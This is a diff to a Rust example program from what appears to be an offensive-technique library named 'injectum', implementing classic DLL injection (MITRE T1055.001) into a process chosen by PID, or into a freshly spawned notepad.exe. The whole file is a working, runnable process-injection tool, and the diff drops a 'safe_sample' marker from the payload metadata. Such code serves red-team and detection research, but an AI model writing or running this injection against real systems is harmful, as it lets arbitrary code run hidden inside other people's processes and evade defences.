@@ -1,136 +1,126 @@
 //! Example: T1055.001 - Classic DLL Injection
 //!
-//! ## Requirements
-//! - **Operating System**: Windows
-//! - **Features**: This example requires the `T1055_001` feature to be enabled.
-//!
-//! ## Build
-//! You can build this example with the following command:
+//! Build:
 //! ```sh
 //! cargo build --package injectum --example T1055_001_Classic_DLL --features "tracing,T1055_001" --release
 //! ```
 //!
-//! ## Usage
+//! Usage:
 //! ```sh
-//! ./T1055_001_Classic_DLL.exe <PID> <DLL_PATH>
+//! ./T1055_001_Classic_DLL.exe <DLL_PATH> [PID]
 //! ```
-
-use injectum::{
-    InjectorBuilder, InjectumError, Payload, PayloadMetadata, StrategyType, Target, Technique,
-};
-use std::{env::args, path::PathBuf};
-
-#[cfg(feature = "tracing")]
-use tracing::{error, info};
+//!
+//! If PID is missing, a new 'notepad.exe' process will be spawned and targeted.
 
 #[cfg(not(feature = "tracing"))]
 mod logs {
     #[macro_export]
-    macro_rules! info {
-        ($($arg:tt)*) => {};
+    macro_rules! error {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
     }
     #[macro_export]
-    macro_rules! error {
-        ($($arg:tt)*) => {};
+    macro_rules! info {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
+    }
+    #[macro_export]
+    macro_rules! warn {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
     }
 }
 
-/// Program entry point.
+use injectum::{
+    Error, InjectorBuilder, Payload, PayloadMetadata, Result, Target, Technique,
+    method::DynamicLinkLibrary,
+};
+use std::{env::args, path::PathBuf, process::Command};
+#[cfg(feature = "tracing")]
+use tracing::{error, info, warn};
+
 fn main() {
     if let Err(e) = run() {
         error!("{}", e);
     }
 }
 
-/// Orchestrates the injection workflow.
-fn run() -> Result<(), InjectumError> {
+fn run() -> Result<()> {
     setup_logging();
-
-    let (pid, dll_path) = parse_args()?;
-
+    let (process_id, dll_path) = parse_args()?;
     info!("------------------------------------------------");
-    info!("Target Process ID : {}", pid);
-    info!("Payload Path      : {:?}", dll_path);
-    info!("Technique         : T1055.001 (ClassicDLLInjection)");
+    info!("Target Process ID : {}", process_id);
+    info!("Technique         : T1055.001 (Classic)");
+    info!("Payload           : {:?}", &dll_path);
     info!("------------------------------------------------");
-
-    inject_dll(pid, dll_path)?;
-
-    info!("Injection completed successfully.");
+    inject_dll(process_id, dll_path)?;
+    info!("Injection completed.");
     Ok(())
 }
 
 /// Performs the DLL injection using Injectum.
-fn inject_dll(pid: u32, path: PathBuf) -> Result<(), InjectumError> {
+fn inject_dll(process_id: u32, dll_path: PathBuf) -> Result<()> {
     let payload = Payload::DllFile {
-        path: Some(path),
-        image: None, // Classic injection uses file-based payload
-        meta: PayloadMetadata {
-            description: Some("CLI Argument Payload".into()),
-            safe_sample: true,
-            ..Default::default()
-        },
+        file_path: Some(dll_path),
+        image_bytes: None,
+        metadata: PayloadMetadata::default(),
     };
-
-    let target = Target::Pid(pid);
-    let strategy = StrategyType::new(Technique::T1055_001, Some("ClassicDLLInjection"));
-
+    let technique = Technique::T1055_001(DynamicLinkLibrary::Classic);
     InjectorBuilder::new()
-        .target(target)
-        .strategy(strategy)
+        .target(Target::Pid(process_id))
+        .technique(technique)
         .payload(payload)
         .execute()
 }
 
 /// Parses CLI arguments and validates the PID and DLL path.
-fn parse_args() -> Result<(u32, PathBuf), InjectumError> {
-    let args: Vec<String> = args().collect();
-
-    if args.len() < 3 {
-        print_usage();
-        return Err(InjectumError::Argument(
-            "Missing required arguments.".into(),
-        ));
+fn parse_args() -> Result<(u32, PathBuf)> {
+    let cli_args: Vec<String> = args().collect();
+    if cli_args.len() < 2 {
+        println!("Usage: ./T1055_001_Classic_DLL.exe <DLL_PATH> [PID]");
+        return Err(Error::Validation("Missing DLL path.".into()));
     }
-
-    let pid = args[1].parse::<u32>().map_err(|_| {
-        InjectumError::Argument(format!(
-            "Invalid PID '{}'. Must be a positive integer.",
-            args[1]
-        ))
-    })?;
-
-    let raw_path = &args[2];
-    let path = PathBuf::from(raw_path);
-    let absolute_path = path.canonicalize().map_err(|e| {
-        InjectumError::Argument(format!(
+    // 1. Parse DLL Path (Mandatory)
+    let dll_path = PathBuf::from(&cli_args[1]).canonicalize().map_err(|e| {
+        Error::Validation(format!(
             "DLL path invalid or inaccessible '{}': {}",
-            raw_path, e
+            &cli_args[1], e
         ))
     })?;
-
-    if !absolute_path.exists() || !absolute_path.is_file() {
-        return Err(InjectumError::Argument(format!(
-            "Not a valid file: {:?}",
-            absolute_path
-        )));
+    if !dll_path.exists() {
+        return Err(Error::Validation("File does not exist.".into()));
     }
-
-    Ok((pid, absolute_path))
+    // 2. Parse PID (Optional)
+    let process_id = if cli_args.len() > 2 {
+        cli_args[2].parse::<u32>().map_err(|_| {
+            Error::Validation(format!(
+                "Invalid PID '{}'. Must be a positive integer.",
+                cli_args[2]
+            ))
+        })?
+    } else {
+        warn!("No PID provided. Spawning 'notepad.exe' as a target...");
+        let child_process = Command::new("notepad.exe")
+            .spawn()
+            .map_err(|e| Error::Validation(format!("Failed to spawn dummy target: {}", e)))?;
+        child_process.id()
+    };
+    Ok((process_id, dll_path))
 }
 
 fn setup_logging() {
     #[cfg(feature = "tracing")]
     {
-        // Initialize logging with a default of "info" if RUST_LOG is not set
-        let filter = tracing_subscriber::EnvFilter::try_from_default_env()
-            .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));
-
-        let _ = tracing_subscriber::fmt().with_env_filter(filter).try_init();
+        use tracing_subscriber::EnvFilter;
+        let _ = tracing_subscriber::fmt()
+            .with_target(true)
+            .with_env_filter(
+                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
+            )
+            .without_time()
+            .try_init();
     }
-}
-
-fn print_usage() {
-    println!("Usage:");
-    println!("  T1055_001_Classic_DLL.exe <PID> <DLL_PATH>");
 }
